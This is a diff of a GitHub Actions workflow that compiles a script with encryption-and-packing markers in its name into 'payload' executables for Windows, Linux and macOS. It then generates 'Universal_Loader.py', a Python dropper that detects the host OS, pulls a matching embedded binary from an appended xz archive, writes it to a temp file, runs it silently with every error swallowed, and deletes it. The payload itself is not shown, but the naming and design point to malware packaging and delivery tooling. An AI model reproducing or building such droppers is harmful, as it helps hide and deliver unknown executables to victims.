@@ -2,8 +2,7 @@
 name: Farm
 on: workflow_dispatch
 jobs:
-  desktop-farm:
-    name: Build ${{ matrix.target }}
+  build:
     strategy:
       fail-fast: false
       matrix:
@@ -12,19 +11,20 @@ jobs:
             target: linux
             artifact: payload.linux.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_btdeug9v_Nixon-Enc_Silent_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_0k8kndkd_Nixon-Enc_Debug_Packed.py
           - os: windows-latest
             target: windows
             artifact: payload.windows.exe
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_btdeug9v_Nixon-Enc_Silent_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_0k8kndkd_Nixon-Enc_Debug_Packed.py
           - os: macos-14
             target: macos
             artifact: payload.macos.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_btdeug9v_Nixon-Enc_Silent_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_0k8kndkd_Nixon-Enc_Debug_Packed.py
 
     runs-on: ${{ matrix.os }}
+    name: Build ${{ matrix.target }}
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
@@ -37,3 +37,136 @@ jobs:
           name: ${{ matrix.target }}-build
           path: ${{ matrix.artifact }}
           retention-days: 1
+
+  pack:
+    needs: build
+    runs-on: ubuntu-latest
+    name: Universal Pack
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Download All Artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+      - name: Generate Packer Script
+        run: |
+          cat << 'EOF' > packer.py
+
+import sys, os, tarfile, io, shutil, time, subprocess
+
+def generate_tar_loader_script(tar_path):
+    import tarfile as tf
+    import io as _io
+    with open(tar_path, "rb") as f:
+        tar_data = f.read()
+    bio = _io.BytesIO()
+    with tf.open(fileobj=_io.BytesIO(tar_data), mode="r") as src_tar:
+        with tf.open(fileobj=bio, mode="w:xz", preset=9) as dst_tar:
+            for member in src_tar.getmembers():
+                dst_tar.addfile(member, src_tar.extractfile(member))
+    xz_payload = bio.getvalue()
+    loader_stub = r"""# -*- coding: utf-8 -*-
+import sys,os,tarfile,io,subprocess,platform,tempfile,shutil,stat,time
+def run_payload():
+    s = platform.system().lower()
+    is_android = "android" in s or os.path.exists("/data/data/com.termux") or os.path.exists("/system/build.prop")
+    target = ""
+    if "windows" in s: target = "windows"
+    elif "darwin" in s: target = "darwin"
+    elif is_android: target = "android"
+    elif "linux" in s: target = "linux"
+    else: return
+    try:
+        me = sys.argv[0]
+        if not os.path.exists(me): me = __file__
+        with open(me, "rb") as f:
+            content = f.read()
+        sep = b"\n#_NX_PAYLOAD_START_#\n"
+        idx = content.find(sep)
+        if idx == -1: return
+        archive_data = content[idx + len(sep):]
+        with tarfile.open(fileobj=io.BytesIO(archive_data), mode="r:xz") as tar:
+            try:
+                member = tar.getmember(target)
+            except KeyError:
+                if target == "android":
+                    try: member = tar.getmember("linux")
+                    except: return
+                else: return
+            ext = ".exe" if target == "windows" else ".bin"
+            fd, tmp_path = tempfile.mkstemp(suffix=ext)
+            with os.fdopen(fd, "wb") as f_out:
+                shutil.copyfileobj(tar.extractfile(member), f_out)
+            if target != "windows":
+                try:
+                    st = os.stat(tmp_path)
+                    os.chmod(tmp_path, st.st_mode | stat.S_IEXEC)
+                except: pass
+            
+            try:
+                subprocess.call([tmp_path] + sys.argv[1:])
+            finally:
+                if os.path.exists(tmp_path):
+                    try: os.unlink(tmp_path)
+                    except: pass
+    except Exception: pass
+if __name__=="__main__":
+    run_payload()
+"""
+    return loader_stub, xz_payload
+
+def pack_artifacts():
+    print("[*] Universal Packer Started")
+    artifacts_dir = "artifacts"
+    dist_dir = "dist"
+    os.makedirs(dist_dir, exist_ok=True)
+    
+    binaries = []
+    # Collect binaries from artifacts folder
+    for root, dirs, files in os.walk(artifacts_dir):
+        for file in files:
+            if file.endswith(".exe") or file.endswith(".bin"):
+                src = os.path.join(root, file)
+                # Rename for standard keys (payload.windows.exe -> windows)
+                if "windows" in file: name = "windows"
+                elif "linux" in file: name = "linux"
+                elif "macos" in file: name = "darwin"
+                elif "android" in file: name = "android"
+                else: continue
+                
+                print(f" [+] Found Binary: {name} -> {src}")
+                binaries.append((name, src))
+    
+    if not binaries:
+        print(" [!] No binaries found!")
+        sys.exit(1)
+
+    # Create Tar
+    tar_path = os.path.join(dist_dir, "binaries.tar")
+    with tarfile.open(tar_path, "w") as tar:
+        for name, src in binaries:
+            tar.add(src, arcname=name)
+    
+    # Generate Loader
+    loader_stub, xz_payload = generate_tar_loader_script(tar_path)
+    final_content = loader_stub.encode('utf-8') + b"\n#_NX_PAYLOAD_START_#\n" + xz_payload
+    
+    output_path = "Universal_Loader.py"
+    with open(output_path, "wb") as f:
+        f.write(final_content)
+    print(f" [SUCCESS] Created {output_path} ({len(final_content)} bytes)")
+
+if __name__ == "__main__":
+    pack_artifacts()
+
+EOF
+      - name: Run Packer
+        run: python3 packer.py
+      - name: Upload Universal Loader
+        uses: actions/upload-artifact@v4
+        with:
+          name: Universal_Loader_Output
+          path: Universal_Loader.py
